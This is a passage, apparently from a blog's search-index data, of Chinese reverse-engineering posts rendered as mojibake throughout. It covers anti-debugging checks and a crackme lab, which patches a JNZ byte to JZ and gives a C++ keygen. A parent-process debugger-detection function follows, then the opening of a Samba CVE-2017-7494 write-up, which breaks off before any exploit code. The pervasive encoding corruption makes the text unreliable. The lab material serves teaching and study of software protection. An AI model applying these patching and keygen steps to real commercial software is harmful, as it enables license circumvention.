è°ƒè¯•æ—¶é—´å’Œå¤æ‚åº¦ã€‚ æ¢æµ‹windowsè°ƒè¯•å™¨ ä½¿ç”¨windows APIä½¿ç”¨Windows APIå‡½æ•°æ¢æµ‹è°ƒè¯•å™¨æ˜¯å¦å­˜åœ¨æ˜¯æœ€ç®€å•çš„åè°ƒè¯•æŠ€æœ¯ã€‚é€šå¸¸ï¼Œé˜²æ­¢ä½¿ç”¨APIè¿›è¡Œåè°ƒè¯•çš„æ–¹æ³•æœ‰åœ¨ç¨‹åºè¿è¡ŒæœŸé—´ä¿®æ”¹æ¶æ„ä»£ç ï¼Œä½¿å…¶ä¸èƒ½è°ƒç”¨APIå‡½æ•°ï¼Œæˆ–ä¿®æ”¹è¿”å›å€¼ï¼Œç¡®ä¿æ‰§è¡Œåˆé€‚çš„è·¯å¾„ï¼Œè¿˜æœ‰æŒ‚é’©è¿™äº›å‡½æ•°ã€‚å¸¸ç”¨æ¥æ¢æµ‹è°ƒè¯•å™¨çš„APIå‡½æ•°æœ‰ï¼šIsDebuggerPresent CheckRemoteDebuggerPresent NtQueryInformationProcess OutputDebuggString æ‰‹åŠ¨æ£€æµ‹æ•°æ®ç»“æ„ç¨‹åºç¼–å†™è€…ç»å¸¸æ‰‹åŠ¨æ‰§è¡Œä¸è¿™äº›APIåŠŸèƒ½ç›¸åŒçš„æ“ä½œ æ£€æŸ¥BeingDebuggedå±æ€§ æ£€æµ‹ProcessHeapå±æ€§ æ£€æµ‹NTGlobalFlag ç³»ç»Ÿç—•è¿¹æ£€æµ‹é€šå¸¸ï¼Œæˆ‘ä»¬ä½¿ç”¨è°ƒè¯•å·¥å…·æ¥åˆ†æç¨‹åºï¼Œä½†è¿™äº›å·¥å…·ä¼šåœ¨ç³»ç»Ÿä¸­é©»ç•™ä¸€äº›ç—•è¿¹ã€‚ç¨‹åºé€šè¿‡æœç´¢è¿™ç§ç³»ç»Ÿçš„ç—•è¿¹ï¼Œæ¥ç¡®å®šä½ æ˜¯å¦è¯•å›¾åˆ†æå®ƒã€‚ä¾‹å¦‚ï¼ŒæŸ¥æ‰¾è°ƒè¯•å™¨å¼•ç”¨çš„æ³¨å†Œè¡¨é¡¹ã€‚åŒæ—¶ï¼Œç¨‹åºä¹Ÿå¯ä»¥æŸ¥æ‰¾ç³»ç»Ÿçš„æ–‡ä»¶å’Œç›®å½•ï¼ŒæŸ¥æ‰¾å½“å‰å†…å­˜çš„ç—•è¿¹ï¼Œæˆ–è€…æŸ¥çœ‹å½“å‰è¿›ç¨‹åˆ—è¡¨ï¼Œæ›´æ™®éçš„åšæ³•æ˜¯é€šè¿‡FindWindowsæ¥æŸ¥æ‰¾è°ƒè¯•å™¨ã€‚ è¯†åˆ«è°ƒè¯•å™¨çš„è¡Œä¸ºåœ¨é€†å‘å·¥ç¨‹ä¸­ï¼Œå¯ä»¥ä½¿ç”¨æ–­ç‚¹æˆ–å•æ­¥è°ƒè¯•æ¥å¸®åŠ©åˆ†æï¼Œä½†æ‰§è¡Œè¿™äº›æ“ä½œæ—¶ï¼Œä¼šä¿®æ”¹è¿›ç¨‹ä¸­çš„ä»£ç ã€‚å› æ­¤å¯ä»¥ä½¿ç”¨å‡ ç§åè°ƒè¯•æŠ€æœ¯æ¢æµ‹INTæ‰«æã€å®Œæ•´æ€§æ ¡éªŒä»¥åŠæ—¶é’Ÿæ£€æµ‹ç­‰å‡ ç§ç±»å‹çš„è°ƒè¯•å™¨è¡Œä¸ºã€‚ INTæ‰«æè°ƒè¯•å™¨è®¾ç½®æ–­ç‚¹çš„åŸºæœ¬æœºåˆ¶æ˜¯ç”¨è½¯ä»¶ä¸­æ–­INT 3ï¼Œæœºå™¨ç ä¸º0xCCï¼Œä¸´æ—¶æ›¿æ¢ç¨‹åºä¸­çš„ä¸€æ¡æŒ‡ä»¤ã€‚å› æ­¤å¯ä»¥é€šè¿‡æ‰«æINT 3ä¿®æ”¹æ¥æ£€æµ‹ã€‚ æ‰§è¡Œä»£ç æ ¡éªŒå’Œæ£€æŸ¥ä¸INTæ‰«æç›®çš„ç›¸åŒï¼Œä½†ä»…æ‰§è¡Œæœºå™¨ç çš„CRCæˆ–MD5æ ¡éªŒå’Œæ£€æŸ¥ã€‚ æ—¶é’Ÿæ£€æµ‹è¢«è°ƒè¯•æ—¶ï¼Œè¿›ç¨‹çš„è¿è¡Œé€Ÿåº¦å¤§å¤§é™ä½ï¼Œå¸¸ç”¨æŒ‡ä»¤æœ‰ï¼šrdstc QueryPerformanceCounter GetTickCount,æœ‰å¦‚ä¸‹ä¸¤ç§æ–¹å¼æ¢æµ‹æ—¶é’Ÿï¼š è®°å½•æ‰§è¡Œä¸€æ®µæ“ä½œå‰åçš„æ—¶é—´æˆ³ è®°å½•è§¦å‘ä¸€ä¸ªå¼‚å¸¸å‰åçš„æ—¶é—´æˆ³å¹²æ‰°è°ƒè¯•å™¨çš„åŠŸèƒ½æœ¬åœ°å­˜å‚¨(TLS)å›è°ƒï¼šTLSå›è°ƒè¢«ç”¨æ¥åœ¨ç¨‹åºå…¥å£ç‚¹æ‰§è¡Œä¹‹å‰è¿è¡Œä»£ç ï¼Œè¿™å‘ç”Ÿåœ¨ç¨‹åºåˆšè¢«åŠ è½½åˆ°è°ƒè¯•å™¨æ—¶ä½¿ç”¨å¼‚å¸¸ï¼šä½¿ç”¨SEHé“¾å¯ä»¥å®ç°å¼‚å¸¸ï¼Œç¨‹åºå¯ä»¥ä½¿ç”¨å¼‚å¸¸æ¥ç ´åæˆ–æ¢æµ‹è°ƒè¯•å™¨ï¼Œè°ƒè¯•å™¨æ•è·å¼‚å¸¸åï¼Œå¹¶ä¸ä¼šå°†å¤„ç†æƒç«‹å³è¿”å›ç»™è¢«è°ƒè¯•è¿›ç¨‹ã€‚æ’å…¥ä¸­æ–­ï¼šæ’å…¥INT 3ã€INT 2Dã€ICEè°ƒè¯•å™¨æ¼æ´PEå¤´æ¼æ´ã€OutputDebugStringæ¼æ´ å®éªŒä¸€ï¼šè½¯ä»¶ç ´è§£å¯¹è±¡crack.exeï¼Œ28.0 KB æ— ä¿æŠ¤æªæ–½ï¼šæ— å£³ã€æœªåŠ å¯†ã€æ— åè°ƒè¯•æªæ–½ ç”¨æˆ·åè‡³å°‘è¦5ä¸ªå­—èŠ‚ è¾“å…¥é”™è¯¯éªŒè¯ç æ—¶è¾“å‡ºï¼šâ€œBad Boy!â€ çˆ†ç ´æŸ¥æ‰¾æ˜¾ç¤ºæ³¨å†Œç»“æœç›¸å…³ä»£ç å½“è¾“å…¥é”™è¯¯éªŒè¯ç æ—¶ï¼Œç¨‹åºä¼šè¾“å‡ºâ€œBad Boyâ€ï¼Œå› æ­¤æˆ‘ä»¬å°†ç¨‹åºæ‹–å…¥IDAï¼Œä»¥æµç¨‹å›¾æ˜¾ç¤ºå‡½æ•°å†…éƒ¨çš„è·³è½¬ã€‚æŸ¥æ‰¾â€œBad Boyâ€å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å¯ä»¥å®šä½åˆ°æ˜¾ç¤ºæ³¨å†Œç»“æœçš„ç›¸å…³ä»£ç ï¼š æŸ¥æ‰¾æ³¨å†Œç éªŒè¯ç›¸å…³ä»£ç ç”¨é¼ æ ‡é€‰ä¸­ç¨‹åºåˆ†æ”¯ç‚¹ï¼ŒæŒ‰ç©ºæ ¼åˆ‡æ¢å›æ±‡ç¼–æŒ‡ä»¤ç•Œé¢ å¯ä»¥çœ‹åˆ°ï¼Œè¿™æ¡æŒ‡ä»¤ä½äºPEæ–‡ä»¶çš„.textèŠ‚ï¼Œå¹¶ä¸”IDAå·²ç»è‡ªåŠ¨å°†åœ°å€è½¬æ¢ä¸ºè¿è¡Œæ—¶çš„å†…å­˜åœ°å€VA:004010F9 ä¿®æ”¹ç¨‹åºè·³è½¬ ç°åœ¨å…³é—­IDAï¼Œæ¢ç”¨OllyDbgè¿›è¡ŒåŠ¨æ€è°ƒè¯•æ¥çœ‹çœ‹ç¨‹åºæ—¶å¦‚ä½•åˆ†æ”¯è·³è½¬çš„Ctrl+Gç›´æ¥è·³åˆ°ç”±IDAå¾—åˆ°çš„VA:004010F9å¤„æŸ¥çœ‹é‚£æ¡å¼•èµ·ç¨‹åºåˆ†æ”¯çš„å…³é”®æŒ‡ä»¤ é€‰ä¸­è¿™æ¡æŒ‡ä»¤ï¼ŒæŒ‰F2è®¾ç½®æ–­ç‚¹ï¼Œå†æŒ‰F9è¿è¡Œç¨‹åºï¼Œè¿™æ—¶å€™æ§åˆ¶æƒä¼šå›åˆ°ç¨‹åºï¼ŒOllyDbgæš‚æ—¶æŒ‚èµ·ã€‚åˆ°ç¨‹åºæç¤ºè¾“å…¥åå­—å’Œåºåˆ—å·ï¼Œéšæ„è¾“å…¥ï¼ˆåå­—å¤§äºäº”ä¸ªå­—èŠ‚ï¼‰ï¼Œç‚¹å‡»okåï¼ŒOllyDbgä¼šé‡æ–°ä¸­æ–­ç¨‹åºï¼Œæ”¶å›æ§åˆ¶æƒï¼Œå¦‚å›¾ï¼š éªŒè¯å‡½æ•°çš„è¿”å›å€¼å­˜äºEAXå¯„å­˜å™¨ä¸­ï¼Œifè¯­å¥é€šè¿‡ä»¥ä¸‹ä¸¤æ¡æŒ‡ä»¤æ‰§è¡Œ 12cmp eax,ecxjnz xxxxxxx ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“åºåˆ—å·è¾“å…¥é”™è¯¯æ—¶ï¼ŒEAXä¸­çš„å€¼ä¸º0ï¼Œè·³è½¬å°†è¢«æ‰§è¡Œã€‚å¦‚æœæˆ‘ä»¬æŠŠjnzè¿™æ¡æŒ‡ä»¤ä¿®æ”¹ä¸ºjzï¼Œé‚£ä¹ˆæ•´ä¸ªç¨‹åºçš„é€»è¾‘å°±ä¼šåè¿‡æ¥ã€‚åŒå‡»jnzè¿™æ¡æŒ‡ä»¤ï¼Œå°†å…¶æ”¹ä¸ºjzï¼Œå•å‡»â€æ±‡ç¼–â€å°†å…¶å†™å…¥å†…å­˜å¯ä»¥çœ‹åˆ°æ­¤æ—¶ç¨‹åºæ‰§è¡Œäº†ç›¸åçš„è·¯å¾„ ä¸Šé¢åªæ˜¯åœ¨å†…å­˜ä¸­ä¿®æ”¹ç¨‹åºï¼Œæˆ‘ä»¬è¿˜éœ€è¦åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ä¹Ÿä¿®æ”¹ç›¸åº”çš„å­—èŠ‚ï¼Œè¿™é‡Œè€ƒå¯ŸVAä¸æ–‡ä»¶åœ°å€ä¹‹é—´çš„å…³ç³» ç”¨LordPEæ‰“å¼€.exeæ–‡ä»¶ï¼ŒæŸ¥çœ‹PEæ–‡ä»¶çš„èŠ‚ä¿¡æ¯æ ¹æ®VAä¸æ–‡ä»¶åœ°å€çš„æ¢ç®—å…¬å¼ï¼š123æ–‡ä»¶åç§»åœ°å€ = VA - Image Base - èŠ‚åç§» = 0x004010F9 - 0x00400000 - 0 = 0x10F9 ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™æ¡æŒ‡ä»¤åœ¨PEæ–‡ä»¶ä¸­ä½äº10F9å­—èŠ‚å¤„ï¼Œä½¿ç”¨010Editeræ‰“å¼€crack.exeï¼Œå°†è¿™ä¸€å­—èŠ‚çš„75(JNZ)`æ”¹ä¸º74(JZ)`ï¼Œä¿å­˜åé‡æ–°æ‰§è¡Œï¼Œç ´è§£æˆåŠŸï¼ ç¼–å†™æ³¨å†ŒæœºæŸ¥æ‰¾æ˜¾ç¤ºæ³¨å†Œç»“æœç›¸å…³ä»£ç é€šè¿‡æŸ¥æ‰¾å­—ç¬¦ä¸²â€œgood boyâ€ç­‰ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°æ˜¾ç¤ºæ³¨å†Œç»“æœçš„ç›¸å…³ä»£ç  æŸ¥æ‰¾æ³¨å†Œç éªŒè¯ç›¸å…³ä»£ç å› ä¸ºæ£€æµ‹å¯†é’¥æ˜¯å¦æ­£ç¡®æ—¶ä¼šå°†ç»“æœè¿”å›åˆ°EAXå¯„å­˜å™¨ä¸­ï¼Œå› æ­¤ï¼Œåœ¨æ£€æµ‹å¯†é’¥å‰å¿…ç„¶ä¼šå¯¹EAXå¯„å­˜å™¨æ¸…ç©ºï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°æ³¨å†Œç éªŒè¯çš„ç›¸å…³ä»£ç ã€‚ æ ¹æ®æ³¨å†Œç éªŒè¯ä»£ç ç¼–å†™æ³¨å†Œæœºåˆ†æä¸Šå›¾ç®—æ³•ï¼ŒæŒ‰tabé”®è½¬æ¢ä¸ºé«˜çº§è¯­è¨€1234for ( i = 0; i &lt; v6; v12 = v10 ) v10 = (v6 + v12) * lpStringa[i++];if ( (v12 ^ 0xA9F9FA) == atoi(v15) ) MessageBoxA(hDlg, aTerimaKasihKer, aGoodBoy, 0); å¯ä»¥çœ‹å‡ºï¼Œç”Ÿæˆæ³¨å†Œç ä¸»è¦åœ¨forå¾ªç¯ä¸­å®Œæˆï¼Œä¹‹åå°†ç”Ÿæˆçš„æ³¨å†Œç ä¸è¾“å…¥ç›¸æ¯”è¾ƒï¼Œåˆ¤æ–­æ˜¯å¦æ­£ç¡®ã€‚æ‰€ä»¥ï¼Œåªè¦èƒ½å¼„æ˜ç™½v6ï¼Œv12ï¼Œv10ï¼Œv15çš„å«ä¹‰ï¼Œæˆ‘ä»¬å°±å¯ä»¥è½»æ¾çš„ç¼–å†™æ³¨å†Œæœºã€‚æ‰“å¼€ollybdgï¼Œåœ¨è¿›å…¥å¾ªç¯ä¹‹å‰è®¾ä¸‹æ–­ç‚¹ï¼ŒåŠ¨æ€è°ƒè¯•ç¨‹åº12345678004010CC |&gt; /8B4D 10 |mov ecx,[arg.3] //æ­¤æ—¶ecxä¸ºname004010CF |. 8B55 0C |mov edx,[arg.2] //edxä¸º0x1908004010D2 |. 03D3 |add edx,ebx //edxåŠ ä¸Šnameçš„é•¿åº¦ï¼ˆebxï¼‰004010D4 |. 0FBE0C08 |movsx ecx,byte ptr ds:[eax+ecx] //ecx=61h004010D8 |. 0FAFCA |imul ecx,edx //61h(a) * edx004010DB |. 40 |inc eax //eaxåŠ 1ï¼ˆåˆå§‹ä¸º0ï¼‰004010DC |. 894D 0C |mov [arg.2],ecx004010DF |. 3BC3 |cmp eax,ebx //å¾ªç¯æ˜¯å¦ç»“æŸ arg.3ä¸ºè¾“å…¥çš„nameï¼Œarg.2åˆå§‹ä¸º0x1908ï¼Œebxä¸ºnameçš„é•¿åº¦ï¼Œeaxæ¯æ¬¡å¾ªç¯åŠ 1ç›´åˆ°ç­‰äºé•¿åº¦å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹å‚æ•°çš„å«ä¹‰è¿›è¡Œè§£é‡Šå¦‚ä¸‹1234567891011v12 = 6408; //0x1908v10 = 6408; //0x1908v6 = len(name);v12 = input_serial;for ( i = 0; i &lt; v6; i++ )&#123; v12 = v10ï¼› v10 = (v6 + v12) * lpStringa[i];&#125;if ((v12 ^ 0xA9F9FA) == atoi(v15))&#123; MessageBoxA(hDlg, aTerimaKasihKer, aGoodBoy, 0);&#125; å¯è§ï¼Œv12^0xA9F9FAçš„ç»“æœå³æ˜¯æ­£ç¡®çš„æ³¨å†Œç ï¼Œæˆ‘ä»¬ç¼–å†™ä¸€ä¸ªç®€å•çš„ç¨‹åºå¸®åŠ©æˆ‘ä»¬ç”Ÿæˆæ³¨å†Œç ï¼š123456789101112131415161718#include &lt;iostream&gt;#include&lt;stdio.h&gt;using namespace::std;int main()&#123; int v12; int v10 = 6408; //0x1908 string name; cout &lt;&lt; &quot;è¯·è¾“å…¥name: &quot;; cin &gt;&gt; name; int len = name.size(); for(int i = 0; i &lt; len+1; i++ )&#123; v12 = v10; v10 = (len + v12) * name[i]; &#125; cout&lt;&lt;&quot;\\n&quot;&lt;&lt;&quot;æ³¨å†Œç ä¸º: &quot;&lt;&lt;(v12 ^ 0xA9F9FA)&lt;&lt;endl; return 0;&#125; è®¡ç®—å‡ºâ€testnameâ€çš„å¯¹åº”æ³¨å†Œç æ³¨å†ŒæˆåŠŸï¼ å®éªŒäºŒï¼šè½¯ä»¶ååŠ¨æ€è°ƒè¯•æŠ€æœ¯åˆ†æå¯¹è±¡CrackMe1.exe 1641.0 KBæ— ä¿æŠ¤æªæ–½ï¼šæ— å£³ã€æœªåŠ å¯†ã€æ— åè°ƒè¯•æªæ–½ä½¿ç”¨OllyDbgå¯¹è¯¥ç¨‹åºè¿›è¡Œè°ƒè¯•æ—¶ï¼Œç¨‹åºä¼šè‡ªåŠ¨é€€å‡º è¦æ±‚ åˆ†æCrackMe1.exeæ˜¯å¦‚ä½•é€šè¿‡çˆ¶è¿›ç¨‹æ£€æµ‹å®ç°åOllyDbgè°ƒè¯•çš„ åˆ†æé™¤çˆ¶è¿›ç¨‹æ£€æµ‹å¤–ï¼Œè¯¥ç¨‹åºç”¨åˆ°çš„ååŠ¨æ€è°ƒè¯•æŠ€æœ¯ çˆ¶è¿›ç¨‹æ£€æµ‹ä¸€èˆ¬åŒå‡»è¿è¡Œçš„è¿›ç¨‹çš„çˆ¶è¿›ç¨‹éƒ½æ˜¯explorer.exeï¼Œä½†æ˜¯å¦‚æœè¿›ç¨‹è¢«è°ƒè¯•çˆ¶è¿›ç¨‹åˆ™æ˜¯è°ƒè¯•å™¨è¿›ç¨‹ã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœçˆ¶è¿›ç¨‹ä¸æ˜¯explorer.exeåˆ™å¯ä»¥è®¤ä¸ºç¨‹åºæ­£åœ¨è¢«è°ƒè¯•ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950BOOL IsInDebugger()&#123; HANDLE hProcessSnap = NULL; char Expchar[] =&quot;\\\\EXPLORER.EXE&quot;; char szBuffer[MAX_PATH]=&#123;0&#125;; char FileName[MAX_PATH]=&#123;0&#125;; PROCESSENTRY32 pe32 = &#123;0&#125;; hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //å¾—åˆ°æ‰€æœ‰è¿›ç¨‹çš„åˆ—è¡¨å¿«ç…§ if (hProcessSnap == INVALID_HANDLE_VALUE) return FALSE; pe32.dwSize = sizeof(PROCESSENTRY32); if (!Process32First(hProcessSnap, &amp;pe32)) // æŸ¥æ‰¾è¿›ç¨‹ &#123; CloseHandle (hProcessSnap); return FALSE; &#125; do // éå†æ‰€æœ‰è¿›ç¨‹ &#123; if(pe32.th32ProcessID==GetCurrentProcessId() )//åˆ¤æ–­æ˜¯å¦æ˜¯è‡ªå·±çš„è¿›ç¨‹ï¼Ÿ &#123; HANDLE hProcess = OpenProcess (PROCESS_ALL_ACCESS, FALSE, pe32.th32ParentProcessID); //æ‰“å¼€çˆ¶è¿›ç¨‹ if (hProcess) &#123; if (GetModuleFileNameEx(hProcess, NULL, FileName, MAX_PATH) ) // å¾—åˆ°çˆ¶è¿›ç¨‹å &#123; GetWindowsDirectory(szBuffer,MAX_PATH); //å¾—åˆ°ç³»ç»Ÿæ‰€åœ¨ç›®å½• strcat(szBuffer,Expchar); //ç»„åˆæˆç±»ä¼¼çš„å­—ä¸²D:\\Winnt\\Explorer.EXE if(strcmpi (FileName,szBuffer)) // æ¯”è¾ƒå½“å‰æ˜¯å¦ä¸ºExplorer.EXEè¿›ç¨‹ &#123; return TRUE; // çˆ¶è¿›ç¨‹è‹¥ä¸æ˜¯Explorer.EXEï¼Œåˆ™æ˜¯è°ƒè¯•å™¨ &#125; else &#123; return FALSE; // æ— æ³•è·å¾—è¿›ç¨‹å &#125; CloseHandle (hProcess); &#125; else &#123; return FALSE;//æ— æƒè®¿é—®è¯¥è¿›ç¨‹ &#125; &#125; &#125; while (Process32Next(hProcessSnap, &amp;pe32)); CloseHandle (hProcessSnap); return FALSE; &#125; ç”±ä¸Šè¿°ç¤ºä¾‹ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°çˆ¶è¿›ç¨‹æ£€æµ‹ä¸­è°ƒç”¨äº†GetCurrentProcessIdå‡½æ•°æ¥åˆ¤æ–­ã€‚å› æ­¤åœ¨Ollydbgä¸­é¦–å…ˆæ‰¾åˆ°GetCurrentProcessIdæ¨¡å—ï¼ˆCtrl+Nï¼‰ï¼Œç„¶åè®¾ç½®æ–­ç‚¹æŸ¥çœ‹æ–­ç‚¹æ˜¯å¦è®¾ç½®æˆåŠŸè¿è¡Œè¯¥ç¨‹åº,åœ¨æ–­ç‚¹00401932åœä¸‹ï¼Œæ‰“å¼€ä»»åŠ¡ç®¡ç†å™¨ï¼ŒCrackMe1çš„pidä¸º4020=0xFB4ç¨‹åºåœ¨è°ƒç”¨å®ŒGetCurrentProcessIdåï¼Œpidè¢«æ”¾å…¥EAXå¯„å­˜å™¨ä¸­ï¼Œå€¼ä¸º0xFB4ç„¶åè°ƒç”¨Openprocesså‡½æ•°ï¼Œå…¶å‚æ•°processIdä¸º0xFB4ï¼Œè¿”å›è¿›ç¨‹ï¼ˆCrackMe1ï¼‰çš„å¥æŸ„é€šè¿‡ntdll.dllä¸­çš„LoadLibraryAå’ŒGetProcAddresså‡½æ•°æ‰¾åˆ°NtQueryInformationProcess:1PNTQUERYINFORMATIONPROCESS NtQueryInformationProcess = (PNTQUERYINFORMATIONPROCESS)GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;),&quot;NtQueryInformationProcess&quot;); ç”¨OpenProcessè·å¾—çš„å¥æŸ„è®¾ç½®NtQueryInformationProcessçš„å¯¹åº”å‚æ•°ï¼Œç„¶åè°ƒç”¨NtQueryInformationProcessï¼Œä»å…¶è¿”å›å€¼ä¸­å¯ä»¥è·å–åˆ°CrackMe1.exeçš„çˆ¶è¿›ç¨‹PID=0xDB4=3508,åœ¨ä»»åŠ¡ç®¡ç†å™¨ä¸­æŸ¥çœ‹è¿›ç¨‹åç¡®å®æ˜¯ollydbgç„¶åå†æ¬¡è°ƒç”¨openprocessè·å¾—çˆ¶è¿›ç¨‹çš„å¥æŸ„æœ€åï¼Œè°ƒç”¨GetModuleFileNameExAé€šè¿‡OpenProcessè¿”å›çš„å¥æŸ„è·å–çˆ¶è¿›ç¨‹çš„æ–‡ä»¶åï¼šè‡³æ­¤ï¼ŒæˆåŠŸè·å–åˆ°çˆ¶è¿›ç¨‹çš„æ–‡ä»¶åï¼Œæ¥ä¸‹æ¥å°†è¿›è¡Œçˆ¶è¿›ç¨‹æ–‡ä»¶åä¸â€œc:\\windows\\explore.exeâ€çš„å­—ç¬¦ä¸²æ¯”è¾ƒã€‚EDXä¸­ä¿å­˜explorerå­—ç¬¦ä¸²ï¼ŒESIä¸­ä¿å­˜ollydbgå­—ç¬¦ä¸²ç„¶åè¿›å…¥å¾ªç¯é€ä½æ¯”è¾ƒï¼Œæ¯”è¾ƒæµç¨‹æ˜¯ï¼Œé¦–å…ˆå–esiä¸­ç¬¬ä¸€ä¸ªå­—ç¬¦åˆ°eaxï¼Œå°†EAXçš„å€¼å‡å»41ç„¶åå­˜å…¥excä¸­ï¼Œå¹¶ä¸19æ¯”è¾ƒå¤§å°ï¼Œåˆ¤æ–­æ˜¯å¦å¤§å†™ï¼Œè‹¥æ˜¯åˆ™eaxåŠ ä¸Š20è½¬åŒ–ä¸ºå°å†™ï¼›è½¬åŒ–ä¸ºå°å†™ä¹‹åï¼Œå¯¹edxä¸­çš„å­—ç¬¦åšåŒæ ·æ“ä½œï¼Œç„¶åtest eax eaxåˆ¤æ–­æ˜¯å¦æ¯”è¾ƒå®Œæ¯•ï¼Œè‹¥æ²¡æœ‰åˆ™é€ä¸ªæ¯”è¾ƒï¼Œç›´åˆ°é‡åˆ°ä¸ç›¸ç­‰çš„å­—ç¬¦ã€‚ å…¶ä»–æ£€æµ‹ç”¨EnumWindowsæšä¸¾æ‰€æœ‰å±å¹•ä¸Šçš„é¡¶å±‚çª—å£ï¼Œå¹¶å°†çª—å£å¥æŸ„ä¼ é€ç»™åº”ç”¨ç¨‹åºå®šä¹‰çš„å›è°ƒå‡½æ•°ï¼Œæ­¤å¤„çš„å›è°ƒå‡½æ•°è°ƒç”¨äº†GetWindowTextAå°†æŒ‡å®šçª—å£çš„æ ‡é¢˜æ ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰çš„æ–‡å­—æ‹·è´åˆ°ç¼“å†²åŒºå†…å°†å¾—åˆ°çš„çª—å£æ ‡é¢˜ä¸â€ollydbgâ€ç­‰è¿›è¡Œæ¯”è¾ƒï¼Œçœ‹æ˜¯å¦ä¸ºè°ƒè¯•å™¨ã€‚ å®éªŒä¸‰ï¼šåŠ èŠ±åŠ å¯†åè°ƒè¯•æŠ€æœ¯åˆ†æå¯¹è±¡CrackMe2.exe 9.00 KBä¿æŠ¤æªæ–½ï¼šéƒ¨åˆ†åŠ èŠ±ã€éƒ¨åˆ†åŠ å¯†ã€ç®€å•åè°ƒè¯•æ ¹æ®æç¤º å†…å®¹ åŠ å£³è„±å£³æ·±å…¥ç†è§£ å°è¯•æ‰‹åŠ¨è„±å£³ åˆ†æCrackMe2.exeä¸­èŠ±æŒ‡ä»¤ åˆ†æCrackMe2.exeä¸­çš„è¢«åŠ å¯†çš„å‡½æ•°çš„åŠŸèƒ½ åˆ†æCrackMe2.exeä¸­çš„åè°ƒè¯•æ‰‹æ®µ åˆ†æCrackMe2.exeä¸­æ··åˆçš„64ä½ä»£ç çš„åŠŸèƒ½","categories":[{"name":"äºŒè¿›åˆ¶","slug":"äºŒè¿›åˆ¶","permalink":"https://cool-y.github.io/categories/äºŒè¿›åˆ¶/"}],"tags":[{"name":"é€†å‘","slug":"é€†å‘","permalink":"https://cool-y.github.io/tags/é€†å‘/"},{"name":"ç ´è§£","slug":"ç ´è§£","permalink":"https://cool-y.github.io/tags/ç ´è§£/"}]},{"title":"æŸå‚å•†è·¯ç”±å™¨ä¸Sambaæ¼æ´CVE-2017-7494","slug":"Samba-CVE","date":"2019-03-25T05:45:16.000Z","updated":"2021-04-10T13:47:36.387Z","comments":true,"path":"2019/03/25/Samba-CVE/","link":"","permalink":"https://cool-y.github.io/2019/03/25/Samba-CVE/","excerpt":"","text":"æ¼æ´æè¿°SambaæœåŠ¡å™¨è½¯ä»¶å­˜åœ¨è¿œç¨‹æ‰§è¡Œä»£ç æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®¢æˆ·ç«¯å°†æŒ‡å®šåº“æ–‡ä»¶ä¸Šä¼ åˆ°å…·æœ‰å¯å†™æƒé™çš„å…±äº«ç›®å½•ï¼Œä¼šå¯¼è‡´æœåŠ¡å™¨åŠ è½½å¹¶æ‰§è¡ŒæŒ‡å®šçš„åº“æ–‡ä»¶ã€‚å…·ä½“æ‰§è¡Œæ¡ä»¶å¦‚ä¸‹ï¼š æœåŠ¡å™¨æ‰“å¼€äº†æ–‡ä»¶/æ‰“å°æœºå…±äº«ç«¯å£445ï¼Œè®©å…¶èƒ½å¤Ÿåœ¨å…¬ç½‘ä¸Šè®¿é—® å…±äº«æ–‡ä»¶æ‹¥æœ‰å†™å…¥æƒé™ æ¶æ„æ”»å‡»è€…éœ€çŒœè§£SambaæœåŠ¡ç«¯å…±äº«ç›®å½•çš„ç‰©ç†è·¯å¾„ Sambaä»‹ç»Sambaæ˜¯åœ¨Linuxå’ŒUnixç³»ç»Ÿä¸Šå®ç°SMBåè®®çš„ä¸€ä¸ªå…è´¹è½¯ä»¶ï¼Œç”±æœåŠ¡å™¨åŠå®¢æˆ·ç«¯ç¨‹åºæ„æˆã€‚SMBï¼ˆServer Messages Blockï¼Œä¿¡æ¯æœåŠ¡å—ï¼‰æ˜¯ä¸€ç§åœ¨å±€åŸŸç½‘ä¸Šå…±äº«æ–‡ä»¶å’Œæ‰“å°æœºçš„ä¸€ç§é€šä¿¡åè®®ï¼Œå®ƒä¸ºå±€åŸŸç½‘å†…çš„ä¸åŒè®¡ç®—æœºä¹‹é—´æä¾›æ–‡ä»¶åŠæ‰“å°æœºç­‰èµ„æºçš„å…±äº«æœåŠ¡ã€‚ SMBåè®®æ˜¯å®¢æˆ·æœº/æœåŠ¡å™¨å‹åè®®ï¼Œå®¢æˆ·æœºé€šè¿‡è¯¥åè®®å¯ä»¥è®¿é—®æœåŠ¡å™¨ä¸Šçš„å…±äº«æ–‡ä»¶ç³»ç»Ÿã€æ‰“å°æœºåŠå…¶ä»–èµ„æºã€‚é€šè¿‡è®¾ç½®â€œNetBIOS over TCP/IPâ€ä½¿å¾—Sambaä¸ä½†èƒ½ä¸å±€åŸŸç½‘ç»œä¸»æœºåˆ†äº«èµ„æºï¼Œè¿˜èƒ½ä¸å…¨ä¸–ç•Œçš„ç”µè„‘åˆ†äº«èµ„æºã€‚ æŸå‚å•†è·¯ç”±å™¨çš„smbdç‰ˆæœ¬ä¸º4.0.21ï¼Œè¯¥æ¼æ´å½±å“Samba 3.5.0åˆ°4.6.4/4.5.10/4.4.14çš„ä¸­é—´ç‰ˆæœ¬ã€‚ æ¼æ´æˆå› å¤„äº\\source3\\rpc_server\\src_pipe.cçš„is_known_pipename()å‡½æ•°æœªå¯¹ä¼ è¿›æ¥çš„ç®¡é“åpipenameçš„è·¯å¾„åˆ†éš”ç¬¦/è¿›è¡Œè¯†åˆ«è¿‡æ»¤ï¼Œå¯¼è‡´å¯ä»¥ç”¨ç»å¯¹è·¯å¾„è°ƒç”¨æ¶æ„çš„soæ–‡ä»¶ï¼Œä»è€Œè¿œç¨‹ä»»æ„ä»£ç æ‰§è¡Œã€‚é¦–å…ˆçœ‹åˆ°is_known_pipename()`å‡½æ•° 